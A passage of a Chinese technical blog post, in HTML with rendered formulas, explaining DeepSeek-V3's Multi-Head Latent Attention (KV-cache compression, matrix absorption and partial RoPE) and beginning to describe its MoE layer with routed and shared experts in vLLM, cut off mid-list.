class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:1.4405em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">8</span></span><span class="mord">)</span></span></span></span></span></span></p><p>可以看到，我们在推理时，可以先计算（或者说直接存储该权重） <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mo>=</mo><msup><mrow><mo stretchy="false">(</mo><msup><mi>W</mi><mrow><mi>U</mi><mi>Q</mi></mrow></msup><mo stretchy="false">)</mo></mrow><mi>T</mi></msup><msup><mi>W</mi><mrow><mi>U</mi><mi>K</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W={(W^{UQ})}^TW^{UK}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.3226em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0726em;"><span style="top:-3.2942em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span></span></span></span></span><br>，这样就避免了多次矩阵计算，从而达到既克服 KV Cache过大的问题，又可以减少计算的效果。</p><p>但我们还要考虑 RoPE 的部分，就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>q</mi><mi>t</mi><mi>R</mi></msubsup></mrow><annotation encoding="application/x-tex">q^R_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0883em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.453em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>k</mi><mi>t</mi><mi>R</mi></msubsup></mrow><annotation encoding="application/x-tex">k^R_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0883em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.453em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>，他们带了 RoPE 计算，没有办法直接做此类合并，因为 RoPE 和矩阵乘不满足乘法交换律：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msubsup><mi>k</mi><mi>t</mi><mi>R</mi></msubsup><mo>=</mo><mi mathvariant="normal">RoPE</mi><mo>⁡</mo><mo stretchy="false">(</mo><msup><mi>W</mi><mrow><mi>K</mi><mi>R</mi></mrow></msup><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">)</mo><mo mathvariant="normal">≠</mo><msup><mi>W</mi><mrow><mi>K</mi><mi>R</mi></mrow></msup><mi mathvariant="normal">RoPE</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(9)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">k^R_t=\operatorname{RoPE}(W^{KR}h_t)\neq W^{KR}\operatorname{RoPE}(h_t) \tag{9}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1383em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">RoPE</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mord mathrm">RoPE</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">9</span></span><span class="mord">)</span></span></span></span></span></span></p><p>也就是说，如果我们的 QK 带了 RoPE 运算，那么公式（8）里的小技巧就无法实现了，我们需要老老实实一步步计算出所有的矩阵，这是我们不愿意看到的。</p><p><u>这就是 MLA 作者的点睛之笔。MLA 在设计时，仅对部分 QK 做 RoPE（这里有个假设必须成立，即位置编码信息应用到部分而非全局也可以 work），然后对做了 RoPE 的 QK 做分开计算</u>：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msubsup><mi>q</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow><mi>T</mi></msubsup><msub><mi>k</mi><mrow><mi>j</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><msubsup><mi>c</mi><mi>t</mi><mi>Q</mi></msubsup><mi>T</mi></msup><mo stretchy="false">(</mo><msup><mi>W</mi><mrow><mi>U</mi><mi>Q</mi></mrow></msup><msup><mo stretchy="false">)</mo><mi>T</mi></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><msubsup><mi>q</mi><mi>t</mi><mi>R</mi></msubsup><msup><mo stretchy="false">)</mo><mi>T</mi></msup></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mi>W</mi><mrow><mi>U</mi><mi>K</mi></mrow></msup><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>k</mi><mi>t</mi><mi>R</mi></msubsup></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><msup><msubsup><mi>c</mi><mi>t</mi><mi>Q</mi></msubsup><mi>T</mi></msup><mi>W</mi><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup><mo>+</mo><mo stretchy="false">(</mo><msubsup><mi>q</mi><mi>t</mi><mi>R</mi></msubsup><msup><mo stretchy="false">)</mo><mi>T</mi></msup><msubsup><mi>k</mi><mi>t</mi><mi>R</mi></msubsup></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(10)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">q^T_{t,i}k_{j,i}=\begin{bmatrix}  {c^Q_t}^T(W^{UQ})^T &amp; (q^R_t)^T\end{bmatrix}\begin{bmatrix} W^{UK}c^{KV}_t \\ k^R_t \end{bmatrix}={c^Q_t}^TWc^{KV}_t+(q^R_t)^Tk^R_t \tag{10}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2744em;vertical-align:-0.3831em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4027em;vertical-align:-0.9513em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0252em;"><span style="top:-3.0252em;"><span class="pstrut" style="height:3.1905em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9592em;"><span style="top:-2.4542em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2458em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1905em;"><span style="top:-3.4121em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5252em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0252em;"><span style="top:-3.0252em;"><span class="pstrut" style="height:3.1905em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.453em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5252em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">]</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4513em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4087em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.453em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9513em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.4375em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9592em;"><span style="top:-2.4542em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2458em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1905em;"><span style="top:-3.4121em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:2.4027em;vertical-align:-0.9513em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">10</span></span><span class="mord">)</span></span></span></span></span></span></p><p>即对所有 query，前面的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>h</mi></msub><mo>=</mo><mn>128</mn></mrow><annotation encoding="application/x-tex">d_h=128</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">128</span></span></span></span> 维都是不带位置编码信息的，而另外<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>2</mn></mfrac><msub><mi>d</mi><mi>h</mi></msub><mo>=</mo><mn>64</mn></mrow><annotation encoding="application/x-tex">\frac{1}{2}d_h=64</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">64</span></span></span></span>维则是带旋转位置编码信息的。于是，此时我们仍然能把一部分的 QK 计算简化。当然对于有 RoPE 的矩阵，就要一步一步算了。</p><h1>小结</h1><p>Multi-Head Latent Attention (MLA) 通过的使用低秩矩阵，减少了推理时的 KV Cache，同时保持了与标准多头注意力机制相当的性能。此外，MLA 中采用对部分 QKV 做 RoPE 的方法，既保留了 QKV 中的位置编码信息，又可以减少计算次数，提升推理效率。</p><p>附：DeepSeek-V3 论文中对 DeepSeek v3 架构的解释图。其中下半部分为本文解释的 MLA 机制。</p><h1>MoE 架构</h1><p>接下来我们看一下 DeepSeek-V3 的 MoE 架构。目前，其他许多模型也使用了 MoE(Mixture of Experts) 架构，MoE 架构中包含多个“专家”网络，每个专家专注于处理特定类型的输入或特征。当一个输入进来时，会有一个 Gate 决定将输入路由到哪些最合适的专家进行处理。这样做的好处是，在推理时可以部分激活专家权重，从而减少推理时感知层的计算量。这样一来，模型就能不受限于推理速度，可以进一步做大，包含更多数据信息。</p><p>以 DeepSeek-V3 为例，MoE 层主要由两种类型的专家构成：</p><ul><li>路由专家 (Routed Experts): 数量众多，负责处理特定类型的输入。DeepSeek-V3 的每个 MoE 层包含 256 个路由专家。</li><li>共享专家 (Shared Experts): 数量较少，负责处理所有输入，提供通用的特征提取。DeepSeek-V3 每个 MoE 层包含 1 个共享专家。</li></ul><p>下面我给出这张流程图，详细介绍 vllm 中 deepseek 的 MoE 执行过程：</p><p><img src="/img/LLM/deepseek-v3_moe.jpg" alt=""></p><ol><li>首先，MoE 架构包括了 Shared Exports 和 Routed Exports，上边的路线走了共享专家路线，每个 <span class="katex"><span class="katex-mathml"><math 